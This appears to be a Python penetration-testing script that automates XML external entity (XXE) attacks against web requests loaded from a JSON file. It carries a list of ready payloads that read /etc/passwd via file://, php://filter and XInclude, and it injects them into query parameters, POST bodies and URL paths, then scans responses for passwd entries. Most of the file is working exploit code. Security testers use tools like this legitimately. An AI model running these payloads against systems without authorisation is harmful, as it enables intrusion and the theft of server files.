import json
import logging
import asyncio
import httpx
import re
from urllib.parse import urlparse, urljoin, urlencode, parse_qs
from tabulate import tabulate
from colorama import init, Fore

# Initialize colorama for colored output
init(autoreset=True)

# Configuration
XXE_PAYLOADS = [
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
    '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk">]><foo>&xxe;</foo>',
    '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>'
]
DEFAULT_TIMEOUT = 50

# Concurrency limit for async tasks
SEMAPHORE_LIMIT = 5  # You can adjust this value based on your system's capacity

async def inject_XXE_payload(session, request, semaphore):
    """
    Inject XXE payloads into the request and test for vulnerabilities, including path-based XXE.
    
    Args:
        session: The HTTPX session.
        request: A dictionary containing request details from requests.json.
        semaphore: A semaphore for limiting concurrent requests.
    
    Returns:
        List of dictionaries containing results for each tested payload.
    """
    results = []
    url = request["url"]
    method = request.get("method", "GET").upper()
    headers = request.get("headers", {}).copy()
    body = request.get("body")
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)

    # Semaphore to limit concurrency
    async with semaphore:
        # Test GET requests with query parameters
        if method == "GET" and query_params:
            for param, values in query_params.items():
                for payload in XXE_PAYLOADS:
                    modified_params = query_params.copy()
                    modified_params[param] = [payload for value in values]
                    new_query_string = "&".join(
                        f"{param}={value}" for param, values in modified_params.items() for value in values
                    )
                    new_url = urljoin(url, f"{parsed_url.path}?{new_query_string}")

                    result = await test_XXE(session, new_url, method, headers=headers)
                    if result and result["XXE_detected"]:
                        result["query_params"] = query_params  # Original query parameters
                        result["modified_query_params"] = modified_params  # Modified query parameters
                        result["payload"] = payload  # The payload used
                        results.append(result)
                        break  # Break after detecting XXE and move to the next request

        # Test POST requests with payloads
        elif method == "POST" and body:
            for payload in XXE_PAYLOADS:
                if isinstance(body, str):
                    modified_body = body + payload
                    logging.debug(f"Modified body size (str): {len(modified_body)}")
                    headers.pop("Content-Length", None)
                    headers["Transfer-Encoding"] = "chunked"  # Add chunked encoding
                elif isinstance(body, dict):
                    modified_body = {key: payload for key, value in body.items()}
                    body_str = json.dumps(modified_body)
                    logging.debug(f"Modified body size (dict): {len(body_str)}")
                    headers.pop("Content-Length", None)
                    headers.pop("Transfer-Encoding", None)
                else:
                    modified_body = body

                # Log body size before sending request
                logging.debug(f"Sending request with body size: {len(modified_body)}")

                # Send the request with the modified body
                try:
                    result = await test_XXE(session, url, method, headers=headers, data=modified_body)
                    if result and result["XXE_detected"]:
                        result["post_data"] = body  # Original POST data
                        result["modified_post_data"] = modified_body  # Modified POST data with payload
                        result["payload"] = payload  # The payload used
                        results.append(result)
                        break  # Break after detecting XXE and move to the next request
                except Exception as e:
                    logging.error(f"Error while testing XXE payload: {e}")
                    continue

        # Path-Based XXE Detection (only modify path)
        if method == "GET" or method == "POST":
            path_parts = parsed_url.path.split('/')

            # Look for path segments that could be vulnerable
            for i, part in enumerate(path_parts):
                if part:  # Only modify non-empty path segments
                    for payload in XXE_PAYLOADS:
                        path_parts[i] = payload
                        modified_path = '/'.join(path_parts[:i] + [payload])
                        new_url = urlparse(url)._replace(path=modified_path).geturl()

                        # Send the request with the modified path
                        try:
                            result = await test_XXE(session, new_url, method, headers=headers)
                            if result and result["XXE_detected"]:
                                result["path"] = parsed_url.path  # Original path
                                result["modified_path"] = modified_path  # Modified path with payload
                                result["payload"] = payload  # The payload used
                                results.append(result)
                                break  # Break after detecting XXE and move to the next request
                        except Exception as e:
                            logging.error(f"Error while testing path-based XXE payload: {e}")
                        path_parts[i] = part  # Reset path segment after testing

    return results

async def test_XXE(session, url, method, headers=None, data=None):
    """
    Send an HTTP request and test for XXE vulnerabilities.
    
    Args:
        session: The HTTPX session.
        url: The request URL.
        method: The HTTP method.
        headers: Optional headers for the request.
        data: Optional data for POST requests.
    
    Returns:
        A dictionary with the test results or None if no XXE is detected.
    """
    try:
        response = await session.request(method, url, headers=headers, data=data, timeout=DEFAULT_TIMEOUT)

        for payload in XXE_PAYLOADS:
            if re.search(r'[a-zA-Z_-]{1,}:x:[0-9]{1,}:[0-9]{1,}:', response.text):  # Check for passwd file
                return {
                    "url": url,
                    "method": method,
                    "status_code": response.status_code,
                    "XXE_detected": True,
                    "payload": payload
                }
        return {
            "url": url,
            "method": method,
            "status_code": response.status_code,
            "XXE_detected": False
        }
    except httpx.RequestError as e:
        logging.error(f"Error testing {url} with payload: {data}. Exception: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "XXE_detected": False,
            "error": str(e)
        }
    except Exception as e:
        logging.error(f"Unexpected error testing {url}: {e}")
        return {
            "url": url,
            "method": method,
            "status_code": "Error",
            "XXE_detected": False,
            "error": str(e)
        }

async def process_requests(requests):
    """
    Process all requests from requests.json and check for XXE vulnerabilities.
    
    Args:
        requests: A list of request dictionaries.
    
    Returns:
        A list of results from the XXE tests.
    """
    semaphore = asyncio.Semaphore(SEMAPHORE_LIMIT)  # Limit concurrent tasks
    async with httpx.AsyncClient() as session:
        tasks = [inject_XXE_payload(session, request, semaphore) for request in requests]
        results = await asyncio.gather(*tasks)
        return [item for sublist in results for item in sublist]  # Flatten the results

def load_requests(file_path):
    """
    Load requests from requests.json.
    
    Args:
        file_path: Path to the JSON file containing request details.
    
    Returns:
        A list of request dictionaries.
    """
    with open(file_path, 'r') as f:
        return json.load(f)

def save_results(results, output_file):
    """
    Save results to a JSON file.
    
    Args:
        results: List of results from the XXE tests.
        output_file: Path to the output file.
    """
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)

def save_output_on_exit(sig, frame):
    """Function to save output gracefully when interrupted."""
    logging.info("Saving output before exit...")
    with open("output.json", "w") as f:
        json.dump(requests_data, f, indent=4)
    logging.info("Output saved. Exiting...")
    sys.exit(0)

def print_results(results):
    """
    Print results in a formatted table.
    
    Args:
        results: List of results from the XXE tests.
    """
    # Filter results to only show detected XXE vulnerabilities
    XXE_results = [result for result in results if result["XXE_detected"]]

    if not XXE_results:
        print(Fore.YELLOW + "No XXE vulnerabilities detected.")
        return

    table_data = []
    for result in XXE_results:
        table_data.append([
            result["url"],
            result["method"],
            result["status_code"],
            Fore.RED + "XXE Detected"
        ])
    headers = ["URL", "Method", "Status Code", "XXE Detection"]
    print(tabulate(table_data, headers, tablefmt="grid", stralign="center"))

async def main(input_file, output_file):
    """
    Main function to orchestrate the XXE detection process.
    
    Args:
        input_file: Path to the input JSON file.
        output_file: Path to the output JSON file.
    """
    requests = load_requests(input_file)
    logging.info(f"Loaded {len(requests)} requests for testing.")

    results = await process_requests(requests)
    # Filter results to only include XXE detections
    XXE_results = [result for result in results if result["XXE_detected"]]

    print_results(XXE_results)
    save_results(XXE_results, output_file)
    signal.signal(signal.SIGINT, save_output_on_exit)

if __name__ == "__main__":
    import argparse
    import sys
    import signal

    # Define a signal handler to save results on interrupt
    signal.signal(signal.SIGINT, save_output_on_exit)

    # Command-line argument parsing
    parser = argparse.ArgumentParser(description="XXE Detection Tool")
    parser.add_argument("--input", default="requests.json", help="Input file with requests (default: requests.json)")
    parser.add_argument("--output", default="results_XXE_linux.json", help="Output file for results (default: results_XXE_linux.json)")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose logging")
    args = parser.parse_args()

    # Logging configuration
    logging.basicConfig(
        level=logging.DEBUG if args.verbose else logging.INFO,
        format="%(asctime)s [%(levelname)s] %(message)s",
    )

    # Run the main function in the asyncio event loop
    try:
        asyncio.run(main(args.input, args.output))
    except KeyboardInterrupt:
        print("\nExecution interrupted by user.")

